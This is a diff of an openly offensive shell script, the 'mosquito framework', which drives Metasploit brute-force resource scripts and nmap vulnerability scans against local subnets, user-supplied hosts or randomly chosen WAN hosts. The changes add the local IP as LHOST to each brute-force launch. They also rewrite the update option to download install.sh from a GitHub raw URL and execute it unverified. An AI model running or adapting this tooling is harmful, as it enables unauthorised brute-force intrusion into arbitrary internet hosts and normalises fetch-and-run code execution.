@@ -1,6 +1,6 @@
 #!/bin/sh
 # Author: r00t-3xp10it
-# mosquito framework v:3.13.3 [STABLE]
+# mosquito framework v:3.14.3 [STABLE]
 # Automate remote brute force tasks over WAN/LAN networks
 # GitHub: https://github.com/r00t-3xp10it/resource_files
 # Suspicious Shell Activity - redteam @2019
@@ -12,7 +12,7 @@ resize -s 38 120 > /dev/nul
 # variable declarations _______________________________________
 #                                                             |
 OS=`uname`                                                    # grab OS
-ver="3.13.3"                                                  # mosquito  version
+ver="3.14.3"                                                  # mosquito  version
 SaIU=`arch`                                                   # grab arch in use
 IPATH=`pwd`                                                   # grab mosquito path
 htn=$(hostname)                                               # grab hostname
@@ -80,7 +80,11 @@ time=$(date | awk {'print $4'})
 while getopts ":h,:u,:i," opt; do
     case $opt in
         u)
-        cd aux && ./install.sh -u # update (install.sh -u)
+        cd aux
+        rm -f install.sh > /dev/nul 2>&1
+        wget -qq https://raw.githubusercontent.com/r00t-3xp10it/resource_files/master/aux/install.sh
+        chmod +x install.sh
+        ./install.sh -u # update (install.sh -u)
         exit
         ;;
         i)
@@ -240,6 +244,7 @@ sh_one () {
 sh_two () {
    echo "${BlueF}[${YellowF}running${BlueF}]:${white} brute_force resource_"${Reset};
    sleep 1
+   IPADDR=`ifconfig $InT3R | egrep -w "inet" | awk {'print $2'}` # grab local ip address
    scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning method" --radiolist --column "Pick" --column "Option" FALSE "Scan Local Lan" FALSE "Scan user input rhosts" TRUE "Random search WAN for rhosts" --width 330 --height 200) > /dev/null 2>&1
    echo "$RANGE" > ip_range.txt
    #
@@ -247,14 +252,14 @@ sh_two () {
    #
    if [ "$scan" = "Scan Local Lan" ]; then
       echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24"${Reset};
-      msfconsole -q -x "setg RHOSTS $RANGE.0/24;resource brute_force.rc"
+      msfconsole -q -x "setg RHOSTS $RANGE.0/24;setg LHOST $IPADDR;resource brute_force.rc"
    #
    # scanning user inputs
    #
    elif [ "$scan" = "Scan user input rhosts" ]; then
       echo "${BlueF}[☠]${white} Scanning User input rhosts"${Reset};
       rhost=$(zenity --entry --title "🦟 MOSQUITO 🦟" --text "Input rhosts separated by blank spaces\nExample: 216.15.177.33 162.246.22.133" --width 450) > /dev/null 2>&1
-      msfconsole -q -x "setg RHOSTS $rhost;resource brute_force.rc"
+      msfconsole -q -x "setg RHOSTS $rhost;setg LHOST $IPADDR;resource brute_force.rc"
    #
    # scanning ramdom WAN hosts
    #
@@ -271,7 +276,7 @@ sh_two () {
          sleep 1
       fi
       echo "${BlueF}[☠]${white} Limmit the search to: $sealing hosts"${Reset};
-      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;resource brute_force.rc"
+      msfconsole -q -x "setg RANDOM_HOSTS true;setg LIMMIT $sealing;setg LHOST $IPADDR;resource brute_force.rc"
    else
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
@@ -842,10 +847,10 @@ scan=$(zenity --list --title "🦟 MOSQUITO 🦟" --text "Sellect scanning metho
 
    if [ "$scan" = "Scan Local Lan" ]; then
       echo "${BlueF}[☠]${white} Scanning Local Lan: $RANGE.0/24🦟"${Reset};
-      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -T5 -O --top-ports 1000 --open --script=vuln $RANGE.0/24;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $RANGE.0/24;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
+      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports 1000 --open --script=vuln $RANGE.0/24;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $RANGE.0/24;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
    elif [ "$scan" = "Scan $IPADDR" ]; then
       echo "${BlueF}[☠]${white} Scanning Local Machine: $IPADDR🦟"${Reset};
-      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -T5 -O --top-ports 1000 --open --script=vuln $IPADDR;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $IPADDR;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
+      msfconsole -q -x "workspace -a mosquito;db_nmap -sS -v -Pn -n -T4 -O --top-ports 1000 --open --script=vuln $IPADDR;db_nmap -sV -T5 -Pn --script=freevulnsearch.nse,vulners.nse $IPADDR;hosts -C address,name,os_name,purpose,info;services -c port,proto,state;workspace -d mosquito"
    else
       echo "${BlueF}[${RedF}x${BlueF}]${white} None option sellected, aborting 🦟Bzzzz.."${Reset};
       sleep 2 && sh_main
@@ -907,7 +912,7 @@ cat << !
     ║    E     -     Exit mosquito                                              ║
     ╚───────────────────────────────────────────────────────────────────────────╣
 !
-echo "                                                           🦟${white}SSA${YellowF}©${RedF}RedTeam${YellowF}@${white}2019🦟─╝"${Reset};
+echo "                                                           🦟${BlueF}SSA${YellowF}©${RedF}RedTeam${YellowF}@${BlueF}2019${white}🦟─╝"${Reset};
 echo ""
 echo "${BlueF}[☠]${white} mosquito framework"${Reset}
 sleep 1
